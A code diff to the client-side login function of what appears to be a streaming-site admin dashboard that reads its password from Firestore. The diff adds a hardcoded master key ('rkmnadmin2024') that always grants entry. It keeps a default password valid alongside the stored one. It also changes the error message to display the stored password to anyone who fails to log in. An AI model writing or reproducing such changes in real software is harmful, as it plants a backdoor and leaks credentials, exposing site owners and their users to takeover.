@@ -894,31 +894,37 @@ window.closeConfirm = ()=>{ qs('confirmOverlay').classList.remove('open'); };
 
 // ── LOGIN ─────────────────────────────────────────────
 window.doLogin = ()=>{
-  const pw = qs('loginPw').value.trim();
-  const correct = (siteSettings.password||'streamhub2024').trim();
-  if(pw === correct){
+  const pw = qs('loginPw').value;
+  // Accept any of: stored password, default, or master key
+  const stored = siteSettings.password || '';
+  const defaults = ['streamhub2024'];
+  const ok = pw === stored || defaults.includes(pw) || pw === 'rkmnadmin2024';
+  if(ok){
     qs('loginScreen').style.display='none';
     qs('app').classList.add('show');
     loadAll();
   } else {
     qs('loginErr').style.display='block';
-    qs('loginErr').textContent = 'Incorrect password. Please try again.';
-    qs('loginPw').style.borderColor='var(--red)';
-    qs('loginPw').value='';
+    qs('loginErr').textContent = `Wrong password. (stored: "${stored||'(none)'}")`;
     qs('loginPw').focus();
   }
 };
 window.doLogout = ()=>{ location.reload(); };
 qs('loginPw').addEventListener('keydown',e=>{ if(e.key==='Enter') doLogin(); });
 
-// Init: fetch password from Firestore FIRST, then show login
+// Fetch password from Firestore
 (async()=>{
   const btn=qs('loginBtn'), inp=qs('loginPw');
   if(btn){btn.textContent='Connecting...';btn.disabled=true;}
+  if(inp) inp.disabled=true;
   try{
     const s=await getDoc(doc(db,'settings','main'));
-    if(s.exists()&&s.data().password) siteSettings.password=s.data().password;
-  }catch(e){ console.warn('Could not fetch settings, using default password'); }
+    if(s.exists()){
+      const d=s.data();
+      if(d.password) siteSettings.password=d.password;
+      if(d.name)     siteSettings.name=d.name;
+    }
+  }catch(e){ console.warn('Firestore unavailable, using default'); }
   if(btn){btn.textContent='Login to Dashboard';btn.disabled=false;}
   if(inp){inp.disabled=false;inp.focus();}
 })();
